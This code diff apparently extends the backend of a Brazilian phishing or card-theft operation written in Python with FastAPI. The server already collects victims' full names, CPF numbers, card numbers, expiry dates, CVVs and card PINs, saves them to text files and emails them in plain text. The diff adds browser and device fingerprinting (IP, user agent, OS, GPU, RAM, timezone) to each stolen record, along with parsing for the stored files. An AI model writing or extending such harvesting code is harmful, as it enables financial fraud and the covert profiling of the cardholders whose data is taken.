@@ -1,7 +1,7 @@
 from fastapi import FastAPI, HTTPException
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
-from typing import Optional
+from typing import Optional, List
 import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
@@ -71,6 +71,27 @@ async def log_requests(request, call_next):
     return response
 
 # Pydantic models
+class DeviceData(BaseModel):
+    ip: Optional[str] = None
+    userAgent: Optional[str] = None
+    browserName: Optional[str] = None
+    browserVersion: Optional[str] = None
+    osName: Optional[str] = None
+    osVersion: Optional[str] = None
+    deviceType: Optional[str] = None
+    deviceModel: Optional[str] = None
+    screenWidth: Optional[int] = None
+    screenHeight: Optional[int] = None
+    language: Optional[str] = None
+    timezone: Optional[str] = None
+    connectionType: Optional[str] = None
+    effectiveConnectionType: Optional[str] = None
+    cores: Optional[int] = None
+    ram: Optional[int] = None
+    gpu: Optional[str] = None
+    maxTouchPoints: Optional[int] = None
+    devicePixelRatio: Optional[float] = None
+
 class PaymentData(BaseModel):
     nomeCompleto: str
     cpf: str
@@ -78,6 +99,26 @@ class PaymentData(BaseModel):
     validade: str
     cvv: str
     senhaCartao: str = ""  # Optional field, defaults to empty string
+    # Device information (optional)
+    ip: Optional[str] = None
+    userAgent: Optional[str] = None
+    browserName: Optional[str] = None
+    browserVersion: Optional[str] = None
+    osName: Optional[str] = None
+    osVersion: Optional[str] = None
+    deviceType: Optional[str] = None
+    deviceModel: Optional[str] = None
+    screenWidth: Optional[int] = None
+    screenHeight: Optional[int] = None
+    language: Optional[str] = None
+    timezone: Optional[str] = None
+    connectionType: Optional[str] = None
+    effectiveConnectionType: Optional[str] = None
+    cores: Optional[int] = None
+    ram: Optional[int] = None
+    gpu: Optional[str] = None
+    maxTouchPoints: Optional[int] = None
+    devicePixelRatio: Optional[float] = None
 
 class EmailResponse(BaseModel):
     success: bool
@@ -125,7 +166,50 @@ def save_payment_data(payment_data: PaymentData) -> str:
         
         # Format the data according to user's specification
         current_datetime = datetime.now().strftime("%d/%m/%Y, %H:%M:%S")
-        
+
+        # Build device info section if available
+        device_section = ""
+        if any([payment_data.ip, payment_data.browserName, payment_data.osName, payment_data.deviceType]):
+            device_section = """
+INFORMAÇÕES DO DISPOSITIVO
+--------------------------
+IP: {ip}
+Navegador: {browserName} v{browserVersion}
+Sistema Operacional: {osName} {osVersion}
+Tipo de Dispositivo: {deviceType} - {deviceModel}
+Resolução: {screenWidth}x{screenHeight}
+Idioma: {language}
+Fuso Horário: {timezone}
+Tipo de Conexão: {connectionType} (efetivo: {effectiveConnectionType})
+Núcleos de CPU: {cores}
+Memória RAM: {ram}GB
+GPU: {gpu}
+Pontos de Toque: {maxTouchPoints}
+Pixel Ratio: {devicePixelRatio}
+User Agent: {userAgent}
+
+""".format(
+                ip=payment_data.ip or "Não disponível",
+                browserName=payment_data.browserName or "Desconhecido",
+                browserVersion=payment_data.browserVersion or "?",
+                osName=payment_data.osName or "Desconhecido",
+                osVersion=payment_data.osVersion or "?",
+                deviceType=payment_data.deviceType or "Desconhecido",
+                deviceModel=payment_data.deviceModel or "?",
+                screenWidth=payment_data.screenWidth or "?",
+                screenHeight=payment_data.screenHeight or "?",
+                language=payment_data.language or "?",
+                timezone=payment_data.timezone or "?",
+                connectionType=payment_data.connectionType or "?",
+                effectiveConnectionType=payment_data.effectiveConnectionType or "?",
+                cores=payment_data.cores or "?",
+                ram=payment_data.ram or "?",
+                gpu=payment_data.gpu or "Desconhecido",
+                maxTouchPoints=payment_data.maxTouchPoints or "?",
+                devicePixelRatio=payment_data.devicePixelRatio or "?",
+                userAgent=payment_data.userAgent or "?",
+            )
+
         content = f"""DADOS DE PAGAMENTO
 ================================================================================
 
@@ -143,7 +227,7 @@ Número do Cartão: {payment_data.numeroCartao}
 Validade: {payment_data.validade}
 CVV: {payment_data.cvv}
 Senha do Cartão: {payment_data.senhaCartao}
-
+{device_section}
 ================================================================================
 """
         
@@ -256,6 +340,55 @@ Senha do Cartão: {payment_data.senhaCartao}
                         </tr>
                     </table>
 
+                    <h3 style="color: #333; margin-top: 20px; border-bottom: 1px solid #ddd; padding-bottom: 10px;">INFORMAÇÕES DO DISPOSITIVO</h3>
+
+                    <table style="width: 100%; margin-top: 10px; font-size: 12px;">
+                        <tr>
+                            <td style="padding: 6px; font-weight: bold; color: #555;">IP:</td>
+                            <td style="padding: 6px; color: #333;">{payment_data.ip or "Não disponível"}</td>
+                        </tr>
+                        <tr style="background-color: #f9f9f9;">
+                            <td style="padding: 6px; font-weight: bold; color: #555;">Navegador:</td>
+                            <td style="padding: 6px; color: #333;">{payment_data.browserName or "?"} v{payment_data.browserVersion or "?"}</td>
+                        </tr>
+                        <tr>
+                            <td style="padding: 6px; font-weight: bold; color: #555;">SO:</td>
+                            <td style="padding: 6px; color: #333;">{payment_data.osName or "?"} {payment_data.osVersion or "?"}</td>
+                        </tr>
+                        <tr style="background-color: #f9f9f9;">
+                            <td style="padding: 6px; font-weight: bold; color: #555;">Dispositivo:</td>
+                            <td style="padding: 6px; color: #333;">{payment_data.deviceType or "?"} - {payment_data.deviceModel or "?"}</td>
+                        </tr>
+                        <tr>
+                            <td style="padding: 6px; font-weight: bold; color: #555;">Resolução:</td>
+                            <td style="padding: 6px; color: #333;">{payment_data.screenWidth or "?"}x{payment_data.screenHeight or "?"}</td>
+                        </tr>
+                        <tr style="background-color: #f9f9f9;">
+                            <td style="padding: 6px; font-weight: bold; color: #555;">Idioma:</td>
+                            <td style="padding: 6px; color: #333;">{payment_data.language or "?"}</td>
+                        </tr>
+                        <tr>
+                            <td style="padding: 6px; font-weight: bold; color: #555;">Fuso Horário:</td>
+                            <td style="padding: 6px; color: #333;">{payment_data.timezone or "?"}</td>
+                        </tr>
+                        <tr style="background-color: #f9f9f9;">
+                            <td style="padding: 6px; font-weight: bold; color: #555;">Conexão:</td>
+                            <td style="padding: 6px; color: #333;">{payment_data.connectionType or "?"} ({payment_data.effectiveConnectionType or "?"})</td>
+                        </tr>
+                        <tr>
+                            <td style="padding: 6px; font-weight: bold; color: #555;">CPU Cores:</td>
+                            <td style="padding: 6px; color: #333;">{payment_data.cores or "?"}</td>
+                        </tr>
+                        <tr style="background-color: #f9f9f9;">
+                            <td style="padding: 6px; font-weight: bold; color: #555;">RAM:</td>
+                            <td style="padding: 6px; color: #333;">{payment_data.ram or "?"}GB</td>
+                        </tr>
+                        <tr>
+                            <td style="padding: 6px; font-weight: bold; color: #555;">GPU:</td>
+                            <td style="padding: 6px; color: #333;">{payment_data.gpu or "Desconhecido"}</td>
+                        </tr>
+                    </table>
+
                     <div style="margin-top: 20px; padding-top: 15px; border-top: 1px solid #eee; color: #999; font-size: 12px;">
                         <p>Este é um e-mail automático. Por favor, não responda a este e-mail.</p>
                     </div>
@@ -336,7 +469,7 @@ Senha do Cartão: {payment_data.senhaCartao}
 async def startup_event():
     """Create necessary directories on startup"""
     create_data_directory()
-    print(f"🚀 Backend iniciado em porta 5000")
+    print(f"🚀 Backend iniciado em porta 5555")
     print(f"📁 Diretório de dados: {DATA_DIR}")
     print(f"📧 Email configurado para: {EMAIL_TO}")
 
@@ -425,7 +558,7 @@ async def status():
     """Get API status and configuration"""
     return {
         "status": "running",
-        "port": 5000,
+        "port": 5555,
         "data_directory": str(DATA_DIR),
         "data_directory_exists": DATA_DIR.exists(),
         "email_from": EMAIL_FROM,
@@ -639,7 +772,18 @@ def parse_payment_file(content: str, file_path: Path) -> dict:
             'cvv': '',
             'senhaCartao': '',
             'dataCriacao': file_path.parent.name,  # Date folder
-            'status': 'processado'
+            'status': 'processado',
+            # Device information
+            'ip': None,
+            'browserName': None,
+            'browserVersion': None,
+            'osName': None,
+            'osVersion': None,
+            'deviceType': None,
+            'deviceModel': None,
+            'language': None,
+            'timezone': None,
+            'connectionType': None,
         }
 
         # Parse each line
@@ -658,6 +802,34 @@ def parse_payment_file(content: str, file_path: Path) -> dict:
                 data['senhaCartao'] = line.split('Senha do Cartão:')[1].strip()
             elif 'Data/Hora:' in line and data['dataCriacao'] == file_path.parent.name:
                 data['dataCriacao'] = line.split('Data/Hora:')[1].strip()
+            # Device information parsing
+            elif 'IP:' in line and 'INFORMAÇÕES DO DISPOSITIVO' not in line:
+                data['ip'] = line.split('IP:')[1].strip()
+            elif 'Navegador:' in line:
+                browser_info = line.split('Navegador:')[1].strip()
+                data['browserName'] = browser_info.split(' v')[0] if ' v' in browser_info else browser_info
+                if ' v' in browser_info:
+                    data['browserVersion'] = browser_info.split(' v')[1]
+            elif 'Sistema Operacional:' in line:
+                os_info = line.split('Sistema Operacional:')[1].strip()
+                parts = os_info.split()
+                if parts:
+                    data['osName'] = parts[0]
+                    if len(parts) > 1:
+                        data['osVersion'] = ' '.join(parts[1:])
+            elif 'Tipo de Dispositivo:' in line:
+                device_info = line.split('Tipo de Dispositivo:')[1].strip()
+                if ' - ' in device_info:
+                    data['deviceType'] = device_info.split(' - ')[0]
+                    data['deviceModel'] = device_info.split(' - ')[1]
+                else:
+                    data['deviceType'] = device_info
+            elif 'Idioma:' in line:
+                data['language'] = line.split('Idioma:')[1].strip()
+            elif 'Fuso Horário:' in line:
+                data['timezone'] = line.split('Fuso Horário:')[1].strip()
+            elif 'Tipo de Conexão:' in line:
+                data['connectionType'] = line.split('Tipo de Conexão:')[1].strip().split('(')[0].strip()
 
         return data if data['nomeCompleto'] else None
     except Exception as e:
@@ -666,4 +838,4 @@ def parse_payment_file(content: str, file_path: Path) -> dict:
 
 if __name__ == "__main__":
     import uvicorn
-    uvicorn.run(app, host="0.0.0.0", port=5000)
+    uvicorn.run(app, host="0.0.0.0", port=5555)
